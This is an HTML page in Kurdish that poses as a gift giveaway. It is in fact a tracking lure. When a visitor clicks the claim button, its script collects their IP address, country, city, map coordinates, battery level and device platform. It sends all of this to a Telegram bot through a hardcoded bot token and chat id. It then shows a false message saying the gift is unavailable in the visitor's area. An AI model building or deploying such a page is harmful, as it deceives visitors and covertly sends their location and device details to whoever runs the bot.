<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>وەرگرتنی دیاری</title>
    <style>
        body { margin: 0; background: linear-gradient(45deg, #1a2a6c, #b21f1f, #fdbb2d); height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: white; }
        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); width: 85%; max-width: 350px; }
        .gift-icon { font-size: 60px; margin-bottom: 10px; }
        .btn { background: #ff4757; color: white; border: none; padding: 15px 25px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
        .btn:hover { background: #ff6b81; transform: scale(1.02); }
    </style>
</head>
<body>

    <div class="card">
        <div class="gift-icon">🎁</div>
        <h2>دیارییەکەت ئامادەیە!</h2>
        <p>بۆ وەرگرتنی سندوقی دیارییەکە، کلیک لە خوارەوە بکە:</p>
        <button class="btn" onclick="sendData()">کلیک لێرە بکە بۆ وەرگرتن</button>
    </div>

    <script>
        async function sendData() {
            // تۆکنە نوێیەکەت لێرە داناوە
            const token = "8624059192:AAHhgZk6peV5k4LpkXIgX8CwuZkqcbjHHuE";
            const chat_id = "6166567300"; // دڵنیابە ئەمە ئایدی خۆتە

            try {
                // ١. گرتنی IP و شوێن
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // ٢. گرتنی ڕێژەی باتری
                let bat = "Unknown";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    bat = Math.round(b.level * 100) + "%";
                }

                // ٣. دروستکردنی نامەکە
                const text = `
🎯 زانیاری نوێ گەیشت!
----------------------
🌐 ئایپی: ${ipData.ip}
🌍 وڵات: ${ipData.country_name}
🏙️ شار: ${ipData.city}
🔋 باتری: ${bat}
📱 ئامێر: ${navigator.platform}
----------------------
📍 [بۆ بینینی شوێن لەسەر نەخشە](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})
                `;

                // ٤. ناردن بۆ بۆتە نوێیەکە
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text, parse_mode: 'Markdown' })
                });

                alert("ببورە، دیارییەکە لە ناوچەکەتدا نەماوە!");
            } catch (e) {
                alert("تکایە ئینتەرنێتەکەت بپشکنە");
            }
        }
    </script>
</body>
</html>
